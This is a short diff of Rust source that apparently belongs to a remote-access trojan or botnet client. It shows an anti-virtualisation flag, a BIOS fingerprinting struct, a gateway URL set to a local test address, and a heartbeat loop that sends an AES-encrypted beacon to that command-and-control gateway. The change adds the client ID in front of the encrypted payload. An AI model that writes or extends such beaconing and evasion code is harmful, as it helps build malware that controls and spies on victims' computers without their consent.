@@ -69,7 +69,7 @@ pub struct Win32BIOS {
     pub serialnumber: String,  
 }  
 
-const BUILD_ID: &str = "debug";
+const BUILD_ID: &str = "debug"; 
 const CONNECTION_INTERVAL: u64 = 5;
 const ANTI_VIRTUAL: bool = false;
 const GATEWAY_PATH: &str = "http://127.0.0.1:9999/TESTING";
@@ -237,10 +237,10 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
     loop {
         thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
 
-        let data = aes_256cbc_encrypt(&json!({
+        let data = format!("{}.{}", client_id, aes_256cbc_encrypt(&json!({
             "action": "heartbeat"
         }).to_string().as_bytes(), 
-        encryption_key.as_bytes()).unwrap();
+        encryption_key.as_bytes()).unwrap());
 
         let result = match ureq::post(GATEWAY_PATH).set("User-Agent", "TESTING").send_string(&data) {
             Ok(result) => {
